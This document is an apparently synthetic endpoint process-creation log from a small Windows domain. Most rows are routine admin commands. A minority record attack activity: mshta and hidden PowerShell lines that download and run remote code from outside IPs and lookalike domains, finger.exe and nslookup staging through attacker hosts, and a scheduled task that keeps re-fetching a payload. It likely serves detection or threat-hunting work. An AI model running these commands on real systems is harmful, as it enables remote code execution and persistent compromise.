2026-02-13T22:56:07.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,"mshta.exe ""javascript:d=new ActiveXObject('WScript.Shell');d.Run('powershell -w hidden -c iex(iwr https://45.141.87.30/rd14)',0)""",6083,explorer.exe,42513,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,c1501707b6deed368841aa27564ae054
2026-02-15T00:51:25.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://verify-cdn3.live/rd15.hta,26826,explorer.exe,58431,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,cb973cfa9eb42495f465b5fc7e0eabdd
2026-02-16T01:26:26.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://update-check2.shop/rd16.hta,40425,explorer.exe,9297,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,af0d86fbccd2973dd7060504fb31a6c9
2026-02-16T16:50:11.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe svc@212.193.30.21,41499,explorer.exe,49384,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,dfff2445ce41096c143e9f1c0513a3a1
2026-02-17T22:04:29.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe root@45.141.87.30,28720,explorer.exe,15203,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,0f64a784316df51adccd0a6cc74ee797
2026-02-18T22:49:39.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,ct.exe,C:\Windows\System32\ct.exe,b0aa83e7247b681aef421d9b961e0901a50aadf1,ct.exe 179.43.167.55,41966,explorer.exe,56428,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,786c601bbcd99d75c1815b9dd85bd5f4
2026-02-20T01:27:23.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup payload3.update-check.xyz 212.193.30.21,14970,cmd.exe,26270,cmd.exe,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,1af572d802ce71a5cd850b2a499e6426
2026-02-20T22:42:10.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup stage4.cdn-verify2.shop 45.141.87.30,37680,cmd.exe,10534,cmd.exe,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,bbfd24fcea4c6db9bd16fee87b1512f5
2026-02-21T19:48:25.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup c2-rd3.install-verify2.live 77.91.68.20,47845,cmd.exe,29607,cmd.exe,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,4a9d5860ae15680f5381de4a070a5091
2026-02-22T19:40:42.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""WinDefUpdate2"" /tr ""wscript.exe C:\Users\Public\wd2.vbs"" /sc minute /mo 19 /f",38699,powershell.exe,42753,powershell.exe,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,d7e4396e4958ec6f664f6dd13587dfc2
2026-02-23T20:42:39.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""ChromeHelper2"" /tr ""powershell.exe -w hidden -c iex(iwr https://77.91.68.20/c3)"" /sc minute /mo 19 /f",51308,powershell.exe,44055,powershell.exe,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,7bcb72c2f1ef667f132e7656168900bd
2026-02-01T22:57:58.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-VpnConnection""",25253,explorer.exe,20588,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,6f56722e08b65057542e5af3e7de3ca0
2026-02-01T18:29:32.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Add-VpnConnection -Name CorpVPN -ServerAddress vpn.prod.corp.local""",33521,explorer.exe,28243,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,2509196e847d4f58a5205bcda499ea8c
2026-02-01T19:10:37.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-NetAdapter | Where-Object Status -eq Up""",12064,explorer.exe,4192,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,bb8ee2f15e9066557a2b037066013fae
2026-02-01T18:52:44.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Invoke-GPUpdate -Force""",60916,explorer.exe,34237,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,9a33dfad7515fd5a5bac45c913623d6a
2026-02-01T18:10:53.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-MpThreatDetection""",26823,explorer.exe,18311,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,4de4f0e2c3c7374547941937e1a65a48
2026-02-01T20:48:19.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Start-MpScan -ScanType QuickScan""",54453,explorer.exe,25575,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,61884b627d8167f9a373a5677ffb820f
2026-02-02T01:36:33.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netsh int ip reset,33065,explorer.exe,55264,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,e8c807c6eb6daf1372121a0a914e8e16
2026-02-01T17:47:08.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netsh winsock reset,6292,explorer.exe,7230,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,8f3845c9cc0932114cc867452cce7ec1
2026-02-01T22:09:00.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c powercfg /batteryreport,12036,explorer.exe,37889,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,ace2dd2fc98718a25a75aed718c26423
2026-02-02T01:21:36.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c msconfig,37786,explorer.exe,17373,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,3bdfbeaa7d819047cdcc0de4e4646a40
2026-02-01T16:06:52.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-TimeZone""",32950,explorer.exe,54639,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,0fa948a826a59b3696df8ce0cbfae604
2026-02-01T17:29:51.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-TimeZone -Id 'Central European Standard Time'""",44679,explorer.exe,10925,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,69b73ebf3850d0710b6db8db51a32f39
2026-02-02T01:21:38.000Z,aa3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c,PROD-WS-021,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WinSystemLocale""",37275,explorer.exe,45362,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,mziegler,PROD,S-1-5-21-9876543210-0987654321-123456789-2016,b00ccc2d6d32059bbc213dcc02cbe299
2026-02-01T19:30:00.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-WinUserLanguageList de-DE -Force""",55047,explorer.exe,21639,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,aa076075b6b8fd7124f876e6395c25b6
2026-02-01T23:26:56.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c chkdsk C: /f /r,4620,explorer.exe,14070,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,5b76dfb7a1f95e24da30308398ef6ec1
2026-02-02T00:18:04.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c verifier /query,17265,explorer.exe,34857,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,f1a518d2e3d7b157f170eed5e4b9605c
2026-02-02T01:50:14.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-CimInstance Win32_LogicalDisk""",52258,explorer.exe,32685,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,3f687552b0bfec495a5e578c40af6a3e
2026-02-01T21:59:28.000Z,ff2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b,PROD-WS-020,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-CimInstance Win32_NetworkAdapter""",36514,explorer.exe,31848,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,ahenkel,PROD,S-1-5-21-9876543210-0987654321-123456789-2015,ee99638122f279768710bcc60215a728
2026-02-01T20:23:07.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""New-Item -ItemType Directory -Path C:\Logs\Archive""",27628,explorer.exe,44498,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,a661b6a211090eaefc8e164a94e268ca
2026-02-01T20:07:44.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Copy-Item C:\Logs\*.log C:\Logs\Archive\""",55261,explorer.exe,34223,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,fec8b3b94cc4097989005d336a0dbd64
2026-02-01T17:07:29.000Z,bb4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d,PROD-LT-016,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c robocopy C:\Data \\PROD-FS01\Backup /E /LOG:C:\Logs\robocopy.log,48161,explorer.exe,13781,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,jkuhn,PROD,S-1-5-21-9876543210-0987654321-123456789-2017,97662ea898c845a021b0064845f0719f
2026-02-02T00:23:02.000Z,ee1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a,PROD-WS-019,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-SmbConnection""",35593,explorer.exe,19406,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bkoch,PROD,S-1-5-21-9876543210-0987654321-123456789-2014,682c2fb77abc81d2f99b95971243874a
2026-02-02T00:13:26.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""New-SmbShare -Name DataShare -Path C:\Data -FullAccess PROD\Admins""",17037,explorer.exe,30430,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,c57352520e10cb25000420f2ac2cd702
2026-02-01T18:01:16.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,"cmd.exe /c net share DataShare=C:\Data /GRANT:PROD\Users,READ",20593,explorer.exe,4348,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,daabec7e798c247bdca3435d4f143b7e
2026-02-01T20:33:50.000Z,cc5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e,PROD-LT-017,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-EventLog -LogName Application -EntryType Error -Newest 20""",36389,explorer.exe,8138,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,swagner,PROD,S-1-5-21-9876543210-0987654321-123456789-2018,b4c0b0cfc635e53032d4c5d173ce2d77
